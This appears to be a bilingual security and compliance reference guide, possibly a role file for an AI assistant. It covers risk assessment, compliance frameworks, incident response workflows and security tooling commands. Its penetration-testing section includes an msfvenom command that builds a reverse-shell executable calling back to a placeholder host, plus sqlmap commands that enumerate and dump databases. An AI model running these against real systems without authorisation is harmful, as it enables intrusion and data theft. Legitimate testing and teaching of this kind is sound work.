# Security & Compliance Expert

## Назначение

Руководство для специалистов по безопасности в реализации многоуровневой защиты (defense-in-depth), достижении соответствия отраслевым стандартам (SOC2, ISO27001, GDPR, HIPAA), проведении моделирования угроз и оценки рисков, управлении операциями безопасности и реагировании на инциденты, а также встраивании безопасности на всех этапах SDLC.

## Когда использовать

- Проектирование security architecture для новых систем
- Подготовка к аудитам (SOC2, ISO27001, HIPAA, PCI-DSS)
- Проведение threat modeling и risk assessment
- Настройка security operations center (SOC)
- Реагирование на security incidents
- Внедрение compliance frameworks
- Security review кода и архитектуры
- Оценка рисков третьих сторон (vendor risk assessment)
- Разработка security policies и procedures
- Настройка security monitoring и alerting

## Core Principles

### 1. Defense in Depth
Apply multiple layers of security controls so that if one fails, others provide protection. Never rely on a single security mechanism.

### 2. Zero Trust Architecture
Never trust, always verify. Assume breach and verify every access request regardless of location or network.

### 3. Least Privilege
Grant the minimum access necessary for users and systems to perform their functions. Regularly review and revoke unused permissions.

### 4. Security by Design
Integrate security requirements from the earliest stages of system design, not as an afterthought.

### 5. Continuous Monitoring
Implement ongoing monitoring and alerting to detect anomalies and security events in real-time.

### 6. Risk-Based Approach
Prioritize security efforts based on risk assessment, focusing resources on the most critical assets and likely threats.

### 7. Compliance as Foundation
Use compliance frameworks as a baseline, but go beyond minimum requirements to achieve actual security.

### 8. Incident Readiness
Prepare for security incidents through planning, testing, and regular tabletop exercises. Assume compromise will occur.

---

## Security & Compliance Lifecycle

### Phase 1: Assess & Plan
**Objective**: Understand current security posture and compliance requirements

**Activities**:
- Conduct security assessments and gap analysis
- Identify compliance requirements (SOC2, ISO27001, GDPR, HIPAA, PCI-DSS)
- Perform risk assessments and threat modeling
- Define security policies and standards
- Establish security governance structure
- Create security roadmap with prioritized initiatives

**Deliverables**:
- Risk register with prioritized risks
- Compliance gap analysis report
- Security architecture documentation
- Security policies and procedures
- Security roadmap and budget

### Phase 2: Design & Architect
**Objective**: Design secure systems and architectures

**Activities**:
- Design defense-in-depth architectures
- Implement Zero Trust network architecture
- Design identity and access management (IAM) systems
- Architect data protection and encryption solutions
- Design secure CI/CD pipelines
- Create threat models for applications and systems
- Define security controls and compensating controls

**Deliverables**:
- Security architecture diagrams
- Threat models (STRIDE, PASTA, or attack trees)
- Data flow diagrams with security boundaries
- Encryption and key management design
- IAM design with RBAC/ABAC models
- Security control matrix

### Phase 3: Implement & Harden
**Objective**: Deploy security controls and harden systems

**Activities**:
- Implement security controls (preventive, detective, corrective)
- Configure security tools (SIEM, EDR, CASB, WAF, IDS/IPS)
- Harden operating systems and applications
- Implement encryption at rest and in transit
- Deploy multi-factor authentication (MFA)
- Configure logging and monitoring
- Implement data loss prevention (DLP)
- Set up vulnerability management program

**Deliverables**:
- Hardening baselines and configuration standards
- Deployed security tools and controls
- Encryption implementation
- MFA deployment
- Security monitoring dashboards
- Vulnerability management procedures

### Phase 4: Monitor & Detect
**Objective**: Continuously monitor for threats and anomalies

**Activities**:
- Monitor security logs and events (SIEM)
- Analyze security alerts and anomalies
- Conduct threat hunting
- Perform vulnerability scanning and penetration testing
- Monitor compliance controls
- Track security metrics and KPIs
- Review access logs and privileged account activity
- Analyze threat intelligence feeds

**Deliverables**:
- Security operations center (SOC) runbooks
- Alert triage and escalation procedures
- Threat hunting playbooks
- Vulnerability scan reports
- Penetration test reports
- Security metrics dashboard
- Compliance monitoring reports

### Phase 5: Respond & Recover
**Objective**: Respond to security incidents and recover operations

**Activities**:
- Execute incident response plan
- Contain and eradicate threats
- Perform forensic analysis
- Recover affected systems
- Conduct post-incident reviews
- Update security controls based on lessons learned
- Report incidents to stakeholders and regulators
- Improve detection rules and response procedures

**Deliverables**:
- Incident response reports
- Forensic analysis findings
- Root cause analysis
- Remediation plans
- Updated incident response playbooks
- Regulatory breach notifications (if required)
- Post-incident review and recommendations

### Phase 6: Audit & Improve
**Objective**: Validate compliance and continuously improve security

**Activities**:
- Conduct internal audits
- Prepare for external audits (SOC2, ISO27001)
- Perform compliance assessments
- Review and update security policies
- Conduct security training and awareness programs
- Perform tabletop exercises and disaster recovery drills
- Update risk assessments
- Implement security improvements

**Deliverables**:
- Audit reports (internal and external)
- SOC2 Type II report
- ISO27001 certification
- Compliance attestations
- Updated policies and procedures
- Training completion metrics
- Tabletop exercise results
- Continuous improvement plan

---

## Decision Frameworks

### 1. Risk Assessment Framework

**When to use**: Evaluating security risks and prioritizing mitigation efforts

**Process**:

```
1. Identify Assets
   - What systems, data, and services need protection?
   - What is the business value of each asset?
   - Who are the asset owners?

2. Identify Threats
   - What threat actors might target these assets? (nation-state, cybercriminals, insiders)
   - What are their motivations? (financial gain, espionage, disruption)
   - What are current threat trends?

3. Identify Vulnerabilities
   - What weaknesses exist in systems or processes?
   - What security controls are missing or ineffective?
   - What are known CVEs affecting your systems?

4. Calculate Risk
   Risk = Likelihood × Impact

   Likelihood scale (1-5):
   1 = Rare (< 5% chance in 1 year)
   2 = Unlikely (5-25%)
   3 = Possible (25-50%)
   4 = Likely (50-75%)
   5 = Almost Certain (> 75%)

   Impact scale (1-5):
   1 = Minimal (< $10K loss, no data breach)
   2 = Minor ($10K-$100K, limited data exposure)
   3 = Moderate ($100K-$1M, significant data breach)
   4 = Major ($1M-$10M, extensive data breach, regulatory fines)
   5 = Catastrophic (> $10M, business-threatening)

   Risk Score = Likelihood × Impact (max 25)

5. Prioritize Risks
   - Critical: Risk score 15-25 (immediate action)
   - High: Risk score 10-14 (action within 30 days)
   - Medium: Risk score 5-9 (action within 90 days)
   - Low: Risk score 1-4 (monitor and accept)

6. Determine Risk Response
   - Mitigate: Implement controls to reduce risk
   - Accept: Document acceptance if risk is within tolerance
   - Transfer: Use insurance or third-party services
   - Avoid: Eliminate the activity that creates risk
```

**Output**: Risk register with prioritized risks and mitigation plans

### 2. Security Control Selection

**When to use**: Choosing appropriate security controls for identified risks

**Framework**: Use NIST CSF categories or CIS Controls

```
NIST CSF Functions:
1. Identify (ID)
   - Asset Management
   - Risk Assessment
   - Governance

2. Protect (PR)
   - Access Control
   - Data Security
   - Protective Technology

3. Detect (DE)
   - Anomalies and Events
   - Security Monitoring
   - Detection Processes

4. Respond (RS)
   - Response Planning
   - Communications
   - Analysis and Mitigation

5. Recover (RC)
   - Recovery Planning
   - Improvements
   - Communications

Control Types:
- Preventive: Stop incidents before they occur (MFA, firewalls, encryption)
- Detective: Identify incidents when they occur (SIEM, IDS, log monitoring)
- Corrective: Fix issues after detection (patching, incident response)
- Deterrent: Discourage attackers (security policies, warnings)
- Compensating: Alternative controls when primary controls aren't feasible

Selection Criteria:
1. Does it address the identified risk?
2. Is it cost-effective? (Control cost < Risk value)
3. Is it technically feasible?
4. Does it meet compliance requirements?
5. Can we maintain and monitor it?
```

### 3. Compliance Framework Selection

**When to use**: Determining which compliance frameworks to implement

**Decision Tree**:

```
What type of organization are you?

├─ SaaS/Cloud Service Provider
│  ├─ Selling to enterprises? → SOC2 Type II (required)
│  ├─ International customers? → ISO27001 (strongly recommended)
│  ├─ Handling health data? → HIPAA + HITRUST
│  └─ Handling payment cards? → PCI-DSS

├─ Healthcare Provider/Payer
│  ├─ U.S.-based → HIPAA (required)
│  ├─ International → HIPAA + GDPR
│  └─ Plus: HITRUST for comprehensive framework

├─ Financial Services
│  ├─ U.S. banks → GLBA, SOX (if public)
│  ├─ Payment processing → PCI-DSS (required)
│  ├─ International → ISO27001, local regulations
│  └─ Plus: NIST CSF for framework

├─ E-commerce/Retail
│  ├─ Accept credit cards → PCI-DSS (required)
│  ├─ EU customers → GDPR (required)
│  ├─ California customers → CCPA
│  └─ B2B sales → SOC2 Type II

└─ General Enterprise
   ├─ Selling to enterprises → SOC2 Type II
   ├─ Want broad recognition → ISO27001
   ├─ Government contracts → FedRAMP, NIST 800-53
   └─ Industry-specific → Check sector regulations

Multi-Framework Strategy:
- Start with: SOC2 or ISO27001 (choose one as foundation)
- Add: Data privacy regulations (GDPR, CCPA) as needed
- Layer on: Industry-specific requirements
```

### 4. Incident Severity Classification

**When to use**: Triaging and responding to security incidents

**Severity Levels**:

```
P0 - Critical (Immediate Response)
- Active breach with data exfiltration occurring
- Ransomware encryption in progress
- Complete system outage of critical services
- Unauthorized access to production databases
- Response: Engage CIRT immediately, executive notification, 24/7 effort

P1 - High (Response within 1 hour)
- Confirmed malware on critical systems
- Attempted unauthorized access to sensitive data
- DDoS attack affecting availability
- Significant vulnerability with active exploits
- Response: Engage CIRT, manager notification, work until contained

P2 - Medium (Response within 4 hours)
- Malware on non-critical systems
- Suspicious account activity
- Policy violations with security impact
- Vulnerability requiring patching
- Response: Security team investigation, business hours

P3 - Low (Response within 24 hours)
- Failed login attempts (below threshold)
- Minor policy violations
- Informational security events
- Response: Standard queue, document findings

Classification Factors:
1. Data confidentiality impact (PHI, PII, financial, IP)
2. System availability impact (revenue, operations)
3. Data integrity impact (corruption, unauthorized changes)
4. Number of affected systems/users
5. Regulatory reporting requirements
```

### 5. Vulnerability Prioritization

**When to use**: Prioritizing vulnerability remediation

**Framework**: Enhanced CVSS with business context

```
Base CVSS Score × Business Context Multiplier = Priority Score

CVSS Severity Ranges:
- Critical: 9.0-10.0
- High: 7.0-8.9
- Medium: 4.0-6.9
- Low: 0.1-3.9

Business Context Multipliers:
- Internet-facing production system: 2.0×
- Internal production system: 1.5×
- Systems with sensitive data: 1.5×
- Development/test environment: 0.5×
- Active exploit in the wild: 2.0×
- Compensating controls in place: 0.7×

Priority Levels:
- P0 (Critical): Score ≥ 14 → Patch within 24-48 hours
- P1 (High): Score 10-13.9 → Patch within 7 days
- P2 (Medium): Score 6-9.9 → Patch within 30 days
- P3 (Low): Score < 6 → Patch within 90 days or accept risk

Additional Considerations:
- Can the system be isolated/segmented?
- Are there effective detective controls?
- What is the patching complexity/risk?
- Is there a vendor patch available?
```

### 6. Third-Party Risk Assessment

**When to use**: Evaluating security risks of vendors and partners

**Assessment Framework**:

```
1. Categorize Vendor Risk Level

Low Risk (Minimal assessment):
- No access to systems or data
- Limited integration
- Non-critical service
→ Simple questionnaire

Medium Risk (Standard assessment):
- Limited system access
- Non-sensitive data access
- Important but not critical service
→ Security questionnaire + evidence review

High Risk (Comprehensive assessment):
- Production system access
- Sensitive data processing
- Critical service dependency
→ Full assessment + audit reports + pen test

Critical Risk (Extensive assessment):
- Full production access
- PHI/PII processing
- Business-critical dependency
→ On-site audit + continuous monitoring + SLA

2. Assessment Components

For Medium/High/Critical vendors:
□ Security questionnaire (SIG, CAIQ, or custom)
□ Compliance certifications (SOC2, ISO27001)
□ Insurance certificates (cyber liability)
□ Security policies and procedures
□ Incident response plan
□ Disaster recovery/business continuity plan
□ Data processing agreement (DPA)
□ Penetration test results (for high/critical)
□ Right to audit clause in contract

3. Ongoing Monitoring

- Annual reassessment
- Monitor for breaches/incidents
- Review security updates and patches
- Track compliance certification renewals
- Conduct periodic audits (for critical vendors)

4. Vendor Risk Score

Calculate score (0-100):
- Security maturity: 40 points
- Compliance certifications: 20 points
- Incident history: 15 points
- Financial stability: 15 points
- References and reputation: 10 points

Action based on score:
- 80-100: Approved
- 60-79: Approved with conditions
- 40-59: Requires remediation plan
- < 40: Do not engage
```

---

## Key Security Frameworks & Standards

### NIST Cybersecurity Framework (CSF)
- **Purpose**: Risk-based framework for improving cybersecurity
- **Structure**: 5 Functions, 23 Categories, 108 Subcategories
- **Best for**: General organizations, government contractors
- **Maturity model**: Tier 1 (Partial) to Tier 4 (Adaptive)

### CIS Critical Security Controls
- **Purpose**: Prioritized set of actions for cyber defense
- **Structure**: 18 Controls with Implementation Groups (IG1, IG2, IG3)
- **Best for**: Practical implementation guidance
- **Focus**: Defense against common attack patterns

### ISO/IEC 27001
- **Purpose**: International standard for information security management
- **Structure**: 14 domains, 114 controls (Annex A)
- **Best for**: International recognition, formal certification
- **Requirements**: ISMS (Information Security Management System)

### SOC 2 Type II
- **Purpose**: Service organization controls for security and availability
- **Structure**: Trust Service Criteria (Security, Availability, Confidentiality, Processing Integrity, Privacy)
- **Best for**: SaaS companies, cloud service providers
- **Audit**: 3-12 month observation period

### NIST 800-53
- **Purpose**: Security controls for federal systems
- **Structure**: 20 families, 1000+ controls
- **Best for**: Government contractors, FedRAMP
- **Baselines**: Low, Moderate, High impact systems

### GDPR (General Data Protection Regulation)
- **Purpose**: EU data privacy regulation
- **Scope**: Any organization processing EU residents' data
- **Requirements**: Lawful basis, consent, data subject rights, breach notification
- **Penalties**: Up to 4% of global revenue or €20M

### HIPAA (Health Insurance Portability and Accountability Act)
- **Purpose**: Protect health information (PHI)
- **Scope**: Healthcare providers, payers, business associates
- **Requirements**: Administrative, Physical, Technical safeguards
- **Penalties**: $100-$50,000 per violation, criminal charges possible

### PCI-DSS (Payment Card Industry Data Security Standard)
- **Purpose**: Protect cardholder data
- **Structure**: 12 requirements, 6 control objectives
- **Scope**: Any organization storing, processing, or transmitting card data
- **Levels**: Based on transaction volume (Level 1-4)

---

## Core Security Domains

### 1. Identity & Access Management (IAM)
- Authentication mechanisms (MFA, SSO, passwordless)
- Authorization models (RBAC, ABAC, ReBAC)
- Privileged access management (PAM)
- Identity governance and administration (IGA)
- Directory services (Active Directory, LDAP, Okta, Auth0)

### 2. Network Security
- Network segmentation and micro-segmentation
- Firewalls (next-gen, WAF, application-layer)
- Intrusion detection/prevention (IDS/IPS)
- VPN and secure remote access
- Zero Trust network architecture (ZTNA)
- DDoS protection

### 3. Data Security
- Encryption at rest and in transit (AES-256, TLS 1.3)
- Key management (KMS, HSM)
- Data classification and labeling
- Data loss prevention (DLP)
- Database security (encryption, masking, tokenization)
- Secrets management (Vault, AWS Secrets Manager)

### 4. Application Security
- Secure SDLC and DevSecOps
- SAST (Static Application Security Testing)
- DAST (Dynamic Application Security Testing)
- SCA (Software Composition Analysis)
- Secure code review
- OWASP Top 10 mitigation

### 5. Cloud Security
- Cloud security posture management (CSPM)
- Cloud access security broker (CASB)
- Container security (image scanning, runtime protection)
- Serverless security
- Infrastructure as Code (IaC) security scanning
- Multi-cloud security architecture

### 6. Endpoint Security
- Endpoint detection and response (EDR)
- Antivirus and anti-malware
- Host-based firewalls
- Device encryption (BitLocker, FileVault)
- Mobile device management (MDM)
- Patch management

### 7. Security Operations
- Security Information and Event Management (SIEM)
- Security Orchestration, Automation, and Response (SOAR)
- Threat intelligence platforms (TIP)
- Threat hunting
- Vulnerability management
- Penetration testing and red teaming

### 8. Incident Response
- Incident response plan and playbooks
- Computer forensics and investigation
- Malware analysis
- Threat containment and eradication
- Post-incident review and lessons learned
- Regulatory breach notification

### 9. Governance, Risk & Compliance (GRC)
- Security policies and procedures
- Risk assessment and management
- Compliance management and auditing
- Security awareness training
- Vendor risk management
- Business continuity and disaster recovery

---

## Security Metrics & KPIs

### Risk & Compliance Metrics
- Number of critical/high risks open
- Risk remediation time (mean time to remediate)
- Compliance audit findings (open/closed)
- Compliance control effectiveness rate
- Policy acknowledgment completion rate
- Training completion rate

### Vulnerability Management Metrics
- Mean time to detect (MTTD) vulnerabilities
- Mean time to patch (MTTP)
- Vulnerability backlog (total open, by severity)
- Patch compliance rate (% systems patched within SLA)
- Vulnerability recurrence rate

### Incident Response Metrics
- Mean time to detect (MTTD) incidents
- Mean time to respond (MTTR)
- Mean time to contain (MTTC)
- Mean time to recover (MTTR)
- Number of incidents by severity
- Incident recurrence rate
- False positive rate

### Security Operations Metrics
- SIEM alert volume (total, by severity)
- Alert triage time
- Alert false positive rate
- Security tool coverage (% assets monitored)
- Threat hunting coverage (% environment reviewed)
- Penetration test findings

### Access Management Metrics
- MFA adoption rate
- Privileged account review completion rate
- Access certification completion rate
- Orphaned account count
- Password policy compliance rate
- Failed login attempt rate

### Awareness & Culture Metrics
- Phishing simulation click rate
- Security training completion rate
- Security awareness quiz scores
- Security policy violations
- Security-related helpdesk tickets

---

## Security Tools Ecosystem

### SIEM (Security Information & Event Management)
- Splunk Enterprise Security
- IBM QRadar
- Microsoft Sentinel
- Elastic Security
- Sumo Logic

### EDR/XDR (Endpoint/Extended Detection & Response)
- CrowdStrike Falcon
- SentinelOne
- Microsoft Defender for Endpoint
- Palo Alto Cortex XDR
- Carbon Black

### Vulnerability Management
- Tenable Nessus/Tenable.io
- Qualys VMDR
- Rapid7 InsightVM
- Greenbone OpenVAS (open source)

### Cloud Security
- Wiz
- Prisma Cloud (Palo Alto)
- Lacework
- Orca Security
- AWS Security Hub / Azure Security Center / GCP Security Command Center

### SAST/DAST
- Snyk
- Veracode
- Checkmarx
- SonarQube
- OWASP ZAP (open source)

### Container Security
- Aqua Security
- Sysdig Secure
- Prisma Cloud Compute
- Trivy (open source)

### Secrets Management
- HashiCorp Vault
- AWS Secrets Manager
- Azure Key Vault
- CyberArk

### Identity & Access
- Okta
- Auth0
- Azure AD / Entra ID
- Ping Identity
- CyberArk (PAM)

---

## Common Security Workflows

### 1. Security Incident Response Workflow

```
1. Detection & Alert
   ↓
2. Triage & Classification
   - Determine severity (P0-P3)
   - Assign to responder
   ↓
3. Investigation
   - Gather evidence
   - Analyze logs (SIEM)
   - Determine scope
   ↓
4. Containment
   - Isolate affected systems
   - Block malicious IPs/domains
   - Disable compromised accounts
   ↓
5. Eradication
   - Remove malware
   - Close vulnerabilities
   - Patch systems
   ↓
6. Recovery
   - Restore from backups
   - Verify system integrity
   - Return to production
   ↓
7. Post-Incident Review
   - Document timeline
   - Root cause analysis
   - Update playbooks
   - Implement improvements
   ↓
8. Reporting
   - Executive summary
   - Regulatory notification (if required)
   - Stakeholder communication
```

### 2. Vulnerability Management Workflow

```
1. Asset Discovery
   - Scan network for assets
   - Maintain asset inventory
   ↓
2. Vulnerability Scanning
   - Authenticated scans
   - Unauthenticated scans
   - Agent-based monitoring
   ↓
3. Assessment & Validation
   - Validate findings
   - Remove false positives
   - Add business context
   ↓
4. Prioritization
   - Apply CVSS + context
   - Assign severity (P0-P3)
   - Create remediation tickets
   ↓
5. Remediation
   - Patch systems
   - Apply compensating controls
   - Update configurations
   ↓
6. Verification
   - Rescan to confirm fix
   - Update vulnerability status
   ↓
7. Reporting
   - Metrics dashboard
   - Executive reports
   - Trend analysis
```

### 3. Access Review Workflow

```
1. Schedule Review (Quarterly)
   ↓
2. Generate Access Reports
   - User access by role
   - Privileged accounts
   - Service accounts
   - Orphaned accounts
   ↓
3. Distribute to Managers
   - Each manager reviews their team
   - Certify appropriate access
   ↓
4. Review & Certify
   - Approve legitimate access
   - Flag inappropriate access
   - Identify orphaned accounts
   ↓
5. Remediation
   - Revoke unapproved access
   - Disable orphaned accounts
   - Update RBAC assignments
   ↓
6. Document & Report
   - Certification completion rate
   - Access changes made
   - Compliance evidence
```

### 4. SOC2 Audit Preparation Workflow

```
1. Scoping (3-4 months before)
   - Define in-scope systems
   - Select Trust Service Criteria
   - Engage auditor
   ↓
2. Gap Assessment (2-3 months before)
   - Map controls to requirements
   - Identify control gaps
   - Create remediation plan
   ↓
3. Readiness (1-2 months before)
   - Implement missing controls
   - Document policies/procedures
   - Conduct mock audit
   ↓
4. Evidence Collection (Ongoing)
   - Automate evidence gathering
   - Organize evidence repository
   - Prepare control narratives
   ↓
5. Audit Kickoff
   - Provide evidence to auditor
   - Respond to requests
   - Schedule interviews
   ↓
6. Fieldwork (4-6 weeks)
   - Auditor tests controls
   - Provide additional evidence
   - Address findings
   ↓
7. Report Issuance
   - Review draft report
   - Address any exceptions
   - Receive final SOC2 report
   ↓
8. Continuous Monitoring
   - Monitor control effectiveness
   - Prepare for next audit cycle
```

---

## Best Practices

### Security Architecture
- Design with security in mind from the start (shift-left)
- Apply defense in depth with multiple security layers
- Implement Zero Trust: verify explicitly, use least privilege, assume breach
- Segment networks and limit lateral movement
- Encrypt data at rest and in transit
- Use secure defaults and fail securely

### Access Control
- Enforce multi-factor authentication (MFA) everywhere
- Implement least privilege access
- Use just-in-time (JIT) privileged access
- Regularly review and certify access
- Disable accounts promptly on termination
- Avoid shared accounts and service account abuse

### Security Operations
- Centralize logging with SIEM
- Automate detection and response where possible
- Maintain an incident response plan and test it
- Conduct regular threat hunting exercises
- Keep vulnerability remediation SLAs aggressive
- Practice incident response through tabletop exercises

### Application Security
- Integrate security into CI/CD (DevSecOps)
- Scan code for vulnerabilities (SAST, DAST, SCA)
- Follow OWASP Top 10 guidelines
- Conduct security code reviews for critical changes
- Implement secure API design (authentication, rate limiting, input validation)
- Use security headers (CSP, HSTS, X-Frame-Options)

### Cloud Security
- Use infrastructure as code (IaC) with security scanning
- Enable cloud-native security services (GuardDuty, Security Hub)
- Implement CSPM to monitor misconfigurations
- Use cloud-native encryption and key management
- Apply least privilege IAM policies
- Monitor for shadow IT and unauthorized resources

### Compliance
- Treat compliance as a continuous process, not one-time
- Map controls to multiple frameworks for efficiency
- Automate evidence collection where possible
- Maintain a compliance calendar for deadlines
- Document everything (if it's not documented, it doesn't exist)
- Conduct internal audits before external audits

### Security Culture
- Make security everyone's responsibility
- Conduct regular security awareness training
- Run phishing simulations to test awareness
- Reward security-conscious behavior
- Create clear, accessible security policies
- Foster a culture where reporting security concerns is encouraged

---

## Integration with Other Disciplines

### With DevOps/Platform Engineering
- Integrate security scanning into CI/CD pipelines
- Automate security testing and compliance checks
- Implement Infrastructure as Code (IaC) security
- Use container scanning and runtime protection
- Coordinate on incident response for production issues

### With Enterprise Architecture
- Align security architecture with enterprise architecture
- Participate in architecture review boards
- Ensure security requirements in architecture standards
- Design secure integration patterns
- Define security reference architectures

### With IT Operations
- Coordinate on patch management and change control
- Collaborate on monitoring and alerting
- Joint incident response for security and operational incidents
- Align on backup and disaster recovery procedures
- Coordinate access management and privileged access

### With Product Management
- Provide security requirements for new features
- Participate in threat modeling for new products
- Balance security with user experience
- Advise on privacy and compliance implications
- Support security as a product differentiator

### With Legal/Privacy
- Coordinate on data privacy regulations (GDPR, CCPA)
- Collaborate on breach notification requirements
- Review vendor contracts for security terms
- Support privacy impact assessments
- Align on data retention and deletion policies

---

---

## CLI Commands

### Security Scanning & Analysis

```bash
# SAST - Static Application Security Testing
# Snyk для сканирования кода и зависимостей
snyk test                                    # Scan dependencies for vulnerabilities
snyk code test                               # Scan source code for security issues
snyk container test nginx:latest             # Scan Docker images
snyk iac test                                # Scan Infrastructure as Code (Terraform, K8s)
snyk monitor                                 # Monitor project continuously

# SonarQube для code quality и security
sonar-scanner -Dsonar.projectKey=myproject   # Run SonarQube analysis
sonar-scanner -Dsonar.login=$SONAR_TOKEN     # With authentication

# Semgrep для pattern-based security scanning
semgrep --config=auto .                      # Auto-detect rules
semgrep --config=p/owasp-top-ten .           # OWASP Top 10 rules
semgrep --config=p/security-audit .          # Security audit rules
semgrep --config=p/secrets .                 # Detect secrets in code

# Trivy для container и IaC scanning
trivy image nginx:latest                     # Scan Docker image
trivy fs --security-checks vuln,config .     # Scan filesystem
trivy config .                               # Scan IaC files
trivy sbom myimage.tar                       # Generate SBOM
```

### Vulnerability Management

```bash
# Nessus scanning (если установлен Nessus CLI)
nessuscli scan new --name "Web App Scan" --targets 192.168.1.0/24
nessuscli scan list                          # List scans
nessuscli scan results <scan-id>             # Get scan results

# OpenVAS scanning (open source alternative)
gvm-cli socket --xml "<get_tasks/>"          # List tasks
gvm-cli socket --xml "<start_task task_id='...'/>"  # Start scan

# OWASP ZAP для web application scanning
zap-cli quick-scan http://example.com        # Quick scan
zap-cli active-scan http://example.com       # Active scan
zap-cli spider http://example.com            # Spider website
zap-cli report -o report.html -f html        # Generate report

# Nuclei для vulnerability scanning
nuclei -u https://example.com                # Scan single URL
nuclei -l urls.txt                           # Scan multiple URLs
nuclei -t cves/ -u https://example.com       # Scan for CVEs
nuclei -t exposures/ -u https://example.com  # Check for exposures
```

### Compliance & Audit

```bash
# AWS Security Hub
aws securityhub get-findings --filters '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'
aws securityhub get-compliance-summary       # Get compliance summary
aws securityhub batch-update-findings        # Update findings

# Azure Security Center
az security assessment list                  # List security assessments
az security alert list                       # List security alerts
az security secure-score-controls list       # List secure score controls

# GCP Security Command Center
gcloud scc findings list organizations/$ORG_ID  # List findings
gcloud scc assets list organizations/$ORG_ID    # List assets

# Prowler для AWS/Azure/GCP security assessment
prowler aws                                  # Scan AWS account
prowler aws -f us-east-1                     # Specific region
prowler aws -c check123                      # Specific check
prowler azure                                # Scan Azure subscription
prowler gcp                                  # Scan GCP project

# ScoutSuite для multi-cloud security audit
scout aws                                    # Audit AWS
scout azure                                  # Audit Azure
scout gcp                                    # Audit GCP
```

### Secrets Management

```bash
# HashiCorp Vault
vault kv put secret/myapp/config api_key=xxx  # Store secret
vault kv get secret/myapp/config              # Retrieve secret
vault kv delete secret/myapp/config           # Delete secret
vault secrets enable -path=myapp kv-v2        # Enable secrets engine
vault policy write myapp-policy policy.hcl    # Create policy

# AWS Secrets Manager
aws secretsmanager create-secret --name myapp/api-key --secret-string "xxx"
aws secretsmanager get-secret-value --secret-id myapp/api-key
aws secretsmanager rotate-secret --secret-id myapp/api-key

# Azure Key Vault
az keyvault secret set --vault-name myvault --name api-key --value "xxx"
az keyvault secret show --vault-name myvault --name api-key
az keyvault secret delete --vault-name myvault --name api-key

# Detect secrets in code
trufflehog git https://github.com/user/repo  # Scan git repo
trufflehog filesystem /path/to/code          # Scan filesystem
gitleaks detect --source . --verbose         # Detect secrets with gitleaks
detect-secrets scan                          # Scan for secrets
```

### Security Monitoring & SIEM

```bash
# Splunk
splunk search "index=security error"         # Search logs
splunk add oneshot /var/log/app.log          # Index file
splunk list index                            # List indexes

# Elastic Security
curl -X GET "localhost:9200/_search?q=security"  # Search
curl -X POST "localhost:9200/security-logs/_doc" -d '{"event":"login"}'

# Wazuh (open source SIEM)
/var/ossec/bin/agent_control -l              # List agents
/var/ossec/bin/ossec-logtest                 # Test log parsing
/var/ossec/bin/manage_agents                 # Manage agents

# Falco для runtime security (containers)
falco                                        # Start Falco
falco -r /etc/falco/rules.d/custom.yaml      # Custom rules
```

### Penetration Testing

```bash
# Metasploit
msfconsole                                   # Start Metasploit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > shell.exe

# Nmap для network scanning
nmap -sV -sC target.com                      # Version detection + default scripts
nmap -p- target.com                          # Scan all ports
nmap --script vuln target.com                # Vulnerability scanning
nmap -sU -p 53,161 target.com                # UDP scan

# Burp Suite (если есть CLI)
burp --project-file=myproject.burp           # Load project

# SQLMap для SQL injection testing
sqlmap -u "http://example.com/page?id=1"     # Test URL
sqlmap -u "http://example.com/page?id=1" --dbs  # Enumerate databases
sqlmap -u "http://example.com/page?id=1" --dump  # Dump data
```

### Certificate & TLS Management

```bash
# OpenSSL
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
openssl s_client -connect example.com:443    # Test TLS connection
openssl x509 -in cert.pem -text -noout       # View certificate
openssl verify -CAfile ca.pem cert.pem       # Verify certificate

# Let's Encrypt (Certbot)
certbot certonly --standalone -d example.com  # Get certificate
certbot renew                                # Renew certificates
certbot certificates                         # List certificates

# Check TLS configuration
testssl.sh https://example.com               # Test TLS/SSL
sslscan example.com:443                      # SSL/TLS scanner
```

### Access Control & IAM

```bash
# AWS IAM
aws iam list-users                           # List users
aws iam list-roles                           # List roles
aws iam get-policy --policy-arn arn:aws:iam::xxx:policy/MyPolicy
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::xxx:user/alice --action-names s3:GetObject

# Azure AD
az ad user list                              # List users
az role assignment list                      # List role assignments
az ad group member list --group MyGroup      # List group members

# GCP IAM
gcloud iam roles list                        # List roles
gcloud projects get-iam-policy PROJECT_ID    # Get IAM policy
gcloud projects add-iam-policy-binding PROJECT_ID --member=user:alice@example.com --role=roles/viewer
```

### Incident Response

```bash
# Forensics - Memory dump
volatility -f memory.dump imageinfo          # Identify OS
volatility -f memory.dump --profile=Win7SP1x64 pslist  # List processes
volatility -f memory.dump --profile=Win7SP1x64 netscan  # Network connections

# Forensics - Disk analysis
autopsy                                      # Start Autopsy (GUI)
sleuthkit                                    # CLI forensics tools
fls -r disk.img                              # List files
icat disk.img 1234 > recovered_file          # Recover file

# Network capture
tcpdump -i eth0 -w capture.pcap              # Capture packets
tcpdump -r capture.pcap 'port 443'           # Read capture
wireshark capture.pcap                       # Analyze with Wireshark

# Log analysis
grep -r "failed login" /var/log/             # Search logs
journalctl -u sshd --since "1 hour ago"      # Systemd logs
zgrep "error" /var/log/*.gz                  # Search compressed logs
```

### Compliance Reporting

```bash
# Generate compliance reports
inspec exec compliance-profile -t ssh://server  # Chef InSpec
oscap xccdf eval --profile xccdf_profile.xml    # OpenSCAP

# Docker Bench Security
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock \
  -v /etc:/etc --label docker_bench_security \
  docker/docker-bench-security

# CIS-CAT для CIS benchmarks
./Assessor-CLI.sh -i -rd /var/www/html/ -nts -rp index
```

---

## Best Practices

### Security Architecture
1. **Defense in Depth** - применяй multiple layers of security controls
2. **Zero Trust** - never trust, always verify каждый access request
3. **Least Privilege** - grant minimum access necessary
4. **Security by Design** - integrate security from earliest stages
5. **Fail Securely** - ensure systems fail in secure state
6. **Separation of Duties** - no single person has complete control
7. **Network Segmentation** - isolate critical systems
8. **Encryption Everywhere** - encrypt data at rest and in transit
9. **Secure Defaults** - ship with secure default configurations
10. **Immutable Infrastructure** - use immutable deployments

### Access Control
11. **MFA Everywhere** - enforce multi-factor authentication
12. **Just-in-Time Access** - grant temporary elevated privileges
13. **Regular Access Reviews** - quarterly certification of access
14. **Disable Promptly** - remove access immediately on termination
15. **No Shared Accounts** - each user has unique credentials
